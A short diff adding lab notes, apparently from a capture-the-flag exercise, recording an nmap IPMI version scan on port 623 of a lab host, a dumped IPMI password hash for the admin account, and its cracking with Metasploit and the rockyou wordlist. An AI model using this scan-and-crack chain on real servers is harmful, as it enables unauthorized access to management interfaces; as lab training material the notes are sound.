@@ -1,0 +1,9 @@
+target: 10.129.156.184
+
+sudo nmap -sU --script ipmi-version -p 623 10.129.156.184
+
+version IPMI 2.0! 
+
+hash found: admin:6d5f5ab18200000067d703ba6eb0efd5a731a67ce074743f5cd77beeab621069d084b820f46ab3cfa123456789abcdefa123456789abcdef140561646d696e:7552636a0c1cf6c6f9b6470bb17f88582eb66739
+
+Using metasploit with rockyou the password was revealed as "trinity"
